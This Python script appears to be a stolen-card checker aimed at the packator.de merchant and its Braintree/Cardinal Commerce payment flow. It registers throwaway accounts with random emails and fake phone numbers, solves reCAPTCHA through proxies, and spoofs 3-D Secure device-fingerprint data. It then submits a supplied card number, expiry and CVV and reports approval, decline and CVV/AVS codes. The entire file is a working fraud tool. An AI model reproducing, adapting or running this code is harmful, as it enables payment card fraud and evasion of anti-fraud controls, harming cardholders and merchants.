import requests,re,uuid,random, string
import base64
from capsolv import solve_recaptcha
from proxy import proxies
def getstr(data, first, last):
    try:
        start = data.index(first) + len(first)
        end = data.index(last, start)
        return data[start:end]
    except ValueError:
        return None
def plug_rnd():
    random_chars = "".join(random.choices(string.ascii_letters + string.digits, k=10))
    random_suffix = "".join(random.choices(string.ascii_letters + string.digits, k=28))
    random_yux = "".join(random.choices(string.ascii_letters + string.digits, k=3))
    return f"{random_chars}::{random_suffix}::{random_yux}"

plug = plug_rnd()
plug2 = plug_rnd()
def generate_email():
    domains = ['gmail.com', 'yahoo.com', 'hotmail.com', 'outlook.com', 'outlook.de', 'live.com', 'protonmail.com']
    random_string = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
    domain = random.choice(domains)
    return f"{random_string}@{domain}"

def generate_german_number():
    return '+49' + ''.join(random.choices(string.digits, k=10))

async def Braintree_charge1(cc,mm,yy,cvv):
    bin = cc[:6]
    last4 = cc[-4:]
    email = generate_email()
    number = generate_german_number()
    r = requests.Session()
    r.proxies = proxies()
    session_id = str(uuid.uuid4())
    Fingerprint = "".join(random.choice("0123456789abcdef") for _ in range(32))
    try:
    
        recap = await solve_recaptcha('https://app.packator.de/register', '6LfO9LEqAAAAAFFVoy7LGRYhj2rG_BHaoqtojE6T')
    except:
        return 'Captcha => Error 1st Request','xxxx', 'API Error', '', '', '', ''

    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'en-US,en;q=0.9',
        'cache-control': 'no-cache',
        'content-type': 'application/json;charset=UTF-8',
        'origin': 'https://app.packator.de',
        'pragma': 'no-cache',
        'priority': 'u=1, i',
        'referer': 'https://app.packator.de/',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
    }

    json_data = {
        'sendUpdateEmails': True,
        'firstName': 'Albedo',
        'lastName': 'Jones',
        'phone': number,
        'email': email,
        'password': 'Ayanpro@087',
        'culture': 'de-DE',
        'recaptchaToken': recap,
    }
    try:
        response = r.post('https://api.packator.com/api/v2.6/register', headers=headers, json=json_data).json()
        access_token = response["accessToken"]
        open('Login.txt', 'a').write(f'{email}:{number}\n')
    except:
        return 'Braintree => Error 1st Request','xxxx', 'API Error', '', '', '', ''
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'en-US,en;q=0.9',
        'authorization': f'Bearer {access_token}',
        'cache-control': 'no-cache',
        'origin': 'https://app.packator.de',
        'pragma': 'no-cache',
        'priority': 'u=1, i',
        'referer': 'https://app.packator.de/',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
    }

    response = r.get('https://api.packator.com/api/v2.6/me/payment-method', headers=headers)
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'en-US,en;q=0.9',
        'authorization': f'Bearer {access_token}',
        'cache-control': 'no-cache',
        'content-type': 'application/json;charset=UTF-8',
        'origin': 'https://app.packator.de',
        'pragma': 'no-cache',
        'priority': 'u=1, i',
        'referer': 'https://app.packator.de/',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
    }

    json_data = {
        'address': {
            'street': 'Johannisgarten 74b',
            'postalCode': '99092',
            'city': '99092',
            'countryCode': 'DE',
        },
        'contact': {
            'firstName': 'Albedo',
            'lastName': 'Jones',
            'vat': '',
            'companyName': '',
        },
    }
    try:
        response = r.post('https://api.packator.com/api/v2.6/me/billing', headers=headers, json=json_data)
    except:
        return 'Braintree => Error 2nd Request','xxxx', 'API Error', '', '', '', ''
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'en-US,en;q=0.9',
        'cache-control': 'no-cache',
        'origin': 'https://app.packator.de',
        'pragma': 'no-cache',
        'priority': 'u=1, i',
        'referer': 'https://app.packator.de/',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
    }
    try:  
        response = r.get('https://api.packator.com/api/v2.1/braintree/token', headers=headers).json()
        enc_token = response["token"]
        dec = base64.b64decode(enc_token).decode('utf-8')
        at = getstr(dec, '"authorizationFingerprint":"', '"')
    except:
        return 'Braintree => Error 3rd Request','xxxx', 'API Error', '', '', '', ''
    headers = {
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9',
        'authorization': f'Bearer {at}',
        'braintree-version': '2018-05-10',
        'cache-control': 'no-cache',
        'content-type': 'application/json',
        'origin': 'https://app.packator.de',
        'pragma': 'no-cache',
        'priority': 'u=1, i',
        'referer': 'https://app.packator.de/',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
    }

    json_data = {
        'clientSdkMetadata': {
            'source': 'client',
            'integration': 'custom',
            'sessionId': session_id,
        },
        'query': 'query ClientConfiguration {   clientConfiguration {     analyticsUrl     environment     merchantId     assetsUrl     clientApiUrl     creditCard {       supportedCardBrands       challenges       threeDSecureEnabled       threeDSecure {         cardinalAuthenticationJWT       }     }     applePayWeb {       countryCode       currencyCode       merchantIdentifier       supportedCardBrands     }     googlePay {       displayName       supportedCardBrands       environment       googleAuthorization       paypalClientId     }     ideal {       routeId       assetsUrl     }     kount {       merchantId     }     masterpass {       merchantCheckoutId       supportedCardBrands     }     paypal {       displayName       clientId       privacyUrl       userAgreementUrl       assetsUrl       environment       environmentNoNetwork       unvettedMerchant       braintreeClientId       billingAgreementsEnabled       merchantAccountId       currencyCode       payeeEmail     }     unionPay {       merchantAccountId     }     usBankAccount {       routeId       plaidPublicKey     }     venmo {       merchantId       accessToken       environment       enrichedCustomerDataEnabled    }     visaCheckout {       apiKey       externalClientId       supportedCardBrands     }     braintreeApi {       accessToken       url     }     supportedFeatures   } }',
        'operationName': 'ClientConfiguration',
    }
    try:
        response = r.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data).json()
        jwt_token = response['data']['clientConfiguration']['creditCard']['threeDSecure']['cardinalAuthenticationJWT']
    except:
        return 'Braintree => Error 4th Request','xxxx', 'API Error', '', '', '', ''
    headers = {
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9',
        'authorization': f'Bearer {at}',
        'braintree-version': '2018-05-10',
        'cache-control': 'no-cache',
        'content-type': 'application/json',
        'origin': 'https://assets.braintreegateway.com',
        'pragma': 'no-cache',
        'priority': 'u=1, i',
        'referer': 'https://assets.braintreegateway.com/',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
    }

    json_data = {
        'clientSdkMetadata': {
            'source': 'client',
            'integration': 'custom',
            'sessionId': session_id,
        },
        'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
        'variables': {
            'input': {
                'creditCard': {
                    'number': cc,
                    'expirationMonth': mm,
                    'expirationYear': yy,
                    'cvv': cvv,
                },
                'options': {
                    'validate': False,
                },
            },
        },
        'operationName': 'TokenizeCreditCard',
    }
    try:
        response = r.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
        token = response.json()["data"]["tokenizeCreditCard"]["token"]
    except:
        return 'Braintree => Error 5th Request','xxxx', 'API Error', '', '', '', ''
    headers = {
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'no-cache',
            'content-type': 'application/json;charset=UTF-8',
            'origin': 'https://app.packator.de',
            'pragma': 'no-cache',
            'priority': 'u=1, i',
            'referer': 'https://app.packator.de/',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36',
            'x-cardinal-tid': 'Tid-7972d418-53e0-4ccb-ac30-c3456f4fbe2d',
        }
    json_data = {
            'BrowserPayload': {
                'Order': {
                    'OrderDetails': {},
                    'Consumer': {
                        'BillingAddress': {},
                        'ShippingAddress': {},
                        'Account': {},
                    },
                    'Cart': [],
                    'Token': {},
                    'Authorization': {},
                    'Options': {},
                    'CCAExtension': {},
                },
                'SupportsAlternativePayments': {
                    'cca': True,
                    'hostedFields': False,
                    'applepay': False,
                    'discoverwallet': False,
                    'wallet': False,
                    'paypal': False,
                    'visacheckout': False,
                },
            },
            'Client': {
                'Agent': 'SongbirdJS',
                'Version': '1.35.0',
            },
            'ConsumerSessionId': None,
            'ServerJWT': jwt_token,
        }
    try:
        response = r.post('https://centinelapi.cardinalcommerce.com/V1/Order/JWT/Init', headers=headers, json=json_data).json()
        jwt2 = response['CardinalJWT'] 
        encabezado_base64, carga_util_base64, firma = jwt2.split(".")
        re_1 = base64.urlsafe_b64decode(carga_util_base64 + "=" * (4 - len(carga_util_base64) % 4)).decode("utf-8")
        dref = re.findall(r'"ReferenceId":"([^"]+)', re_1)[0]
        ge = re.findall(r'"geolocation":"([^"]+)', re_1)[0]
        org = re.findall(r'"orgUnitId":"([^"]+)', re_1)[0]
    except:
        return 'Centinel => Error 6th Request','xxxx', 'API Error', '', '', '', ''
    headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'no-cache',
            'pragma': 'no-cache',
            'priority': 'u=0, i',
            'referer': 'https://app.packator.de/',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36',
        }

    params = {
            'threatmetrix': 'true',
            'alias': 'Default',
            'orgUnitId': org,
            'tmEventType': 'PAYMENT',
            'referenceId': dref,
            'geolocation': ge,
            'origin': 'Songbird',
        }
    try:
        response = r.get('https://geo.cardinalcommerce.com/DeviceFingerprintWeb/V2/Browser/Render',params=params,headers=headers)
        nonce = getstr(response.text, 'nonce="', '"')
    except:
        return 'Geo => Error 7th Request','xxxx', 'API Error', '', '', '', ''
    headers = {
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'no-cache',
            'content-type': 'application/json',
            'origin': 'https://geo.cardinalcommerce.com',
            'pragma': 'no-cache',
            'priority': 'u=1, i',
            'referer': f'https://geo.cardinalcommerce.com/DeviceFingerprintWeb/V2/Browser/Render?threatmetrix=true&alias=Default&orgUnitId={org}&tmEventType=PAYMENT&referenceId={dref}&geolocation={ge}&origin=Songbird',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36',
            'x-requested-with': 'XMLHttpRequest',
        }

    json_data = {
            'Cookies': {
                'Legacy': True,
                'LocalStorage': True,
                'SessionStorage': True,
            },
            'DeviceChannel': 'Browser',
            'Extended': {
                'Browser': {
                    'Adblock': True,
                    'AvailableJsFonts': [],
                    'DoNotTrack': 'unknown',
                    'JavaEnabled': False,
                },
                'Device': {
                    'ColorDepth': 24,
                    'Cpu': 'unknown',
                    'Platform': 'Win32',
                    'TouchSupport': {
                        'MaxTouchPoints': 0,
                        'OnTouchStartAvailable': False,
                        'TouchEventCreationSuccessful': False,
                    },
                },
            },
            'Fingerprint': Fingerprint,
            'FingerprintingTime': 1136,
            'FingerprintDetails': {
                'Version': '1.5.1',
            },
            'Language': 'en-US',
            'Latitude': None,
            'Longitude': None,
            'OrgUnitId': org,
            'Origin': 'Songbird',
            "Plugins": [f"{plug}", f"{plug2}"],
            'ReferenceId': dref,
            'Referrer': 'https://www.robertwhite.co.uk/',
            'Screen': {
                'FakedResolution': False,
                'Ratio': 1.7777777777777777,
                'Resolution': '1536x864',
                'UsableResolution': '1536x816',
                'CCAScreenSize': '02',
            },
            'CallSignEnabled': None,
            'ThreatMetrixEnabled': False,
            'ThreatMetrixEventType': 'PAYMENT',
            'ThreatMetrixAlias': 'Default',
            'TimeOffset': -330,
            'UserAgent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36',
            'UserAgentDetails': {
                'FakedOS': False,
                'FakedBrowser': False,
            },
            'BinSessionId': nonce,
        }
    try:
        response = r.post('https://geo.cardinalcommerce.com/DeviceFingerprintWeb/V2/Browser/SaveBrowserData',headers=headers,json=json_data)
    except:
        return 'Geo => Error 8th Request','xxxx', 'API Error', '', '', '', ''
    
    headers = {
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9',
        'cache-control': 'no-cache',
        'content-type': 'application/json',
        'origin': 'https://app.packator.de',
        'pragma': 'no-cache',
        'priority': 'u=1, i',
        'referer': 'https://app.packator.de/',
        'sec-ch-ua': '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
    }

    json_data = {
        'amount': '1',
        'additionalInfo': {},
        'challengeRequested': True,
        'bin': bin,
        'dfReferenceId': dref,
        'clientMetadata': {
            'requestedThreeDSecureVersion': '2',
            'sdkVersion': 'web/3.95.0',
            'cardinalDeviceDataCollectionTimeElapsed': 1204,
            'issuerDeviceDataCollectionTimeElapsed': 6153,
            'issuerDeviceDataCollectionResult': True,
        },
        'authorizationFingerprint': at,
        'braintreeLibraryVersion': 'braintree/web/3.95.0',
        '_meta': {
            'merchantAppId': 'app.packator.de',
            'platform': 'web',
            'sdkVersion': '3.95.0',
            'source': 'client',
            'integration': 'custom',
            'integrationType': 'custom',
            'sessionId': session_id,
        },
    }
    try:
        response = r.post(
            f'https://api.braintreegateway.com/merchants/mxtm24fwvzwy6ts5/client_api/v1/payment_methods/{token}/three_d_secure/lookup',
            headers=headers,
            json=json_data,
        )
        nonce = response.json()["paymentMethod"]["nonce"]
    except:
        return 'Braintree => Error 9th Request','xxxx', 'API Error', '', '', '', ''
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'en-US,en;q=0.9',
        'authorization': f'Bearer {access_token}',
        'cache-control': 'no-cache',
        'content-type': 'application/json;charset=UTF-8',
        'origin': 'https://app.packator.de',
        'pragma': 'no-cache',
        'priority': 'u=1, i',
        'referer': 'https://app.packator.de/',
        'sec-ch-ua': '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
    }

    json_data = {
        'type': 'credit-card',
        'cardType': 'visa',
        'token': '',
        'nonce': nonce,
        'last4digits': last4,
        'label': '',
        'userId': '',
        'expirationDate': f'{mm}/{yy}',
        'createdAt': None,
        'id': '',
    }
    try:
        response = r.post('https://api.packator.com/api/v2.6/me/payment-method', headers=headers, json=json_data)
        if response.status_code != 200:
            processorCode = getstr(response.text, '"processorResponseCode":"', '"')
            processorText = re.findall(r'"message":"(.*?)"', response.text)[1]
            additional = getstr(response.text, '"additionalProcessorResponse":"', '"')
            cvvCode = getstr(response.text, '"cvvResponseCode":"', '"')
            avsPostalCode = getstr(response.text, '"avsPostalCodeResponseCode":"', '"')
            avsStreetCode = getstr(response.text, '"avsStreetAddressResponseCode":"', '"')
            declined_type = getstr(response.text, 'processorResponseType":"', '"')
            return declined_type, processorCode, processorText, additional, avsPostalCode, avsStreetCode, cvvCode
        elif response.status_code == 200:
            processorCode = '1000'
            processorText = 'Charged €1'
            additional = '00'
            cvvCode = 'M'
            avsPostalCode = 'M'
            avsStreetCode = 'M'
            declined_type = 'Approved'
            return declined_type, processorCode, processorText, additional, avsPostalCode, avsStreetCode, cvvCode
        else:
            processorCode = 'xxxx'
            processorText = 'API Error'
            additional = ''
            cvvCode = ''
            avsPostalCode = ''
            avsStreetCode = ''
            declined_type = 'N/A'
            return declined_type, processorCode, processorText, additional, avsPostalCode, avsStreetCode, cvvCode
    except:
        print(response.text)
        return 'API Error', 'xxxx', 'API Error', '', '', '', ''
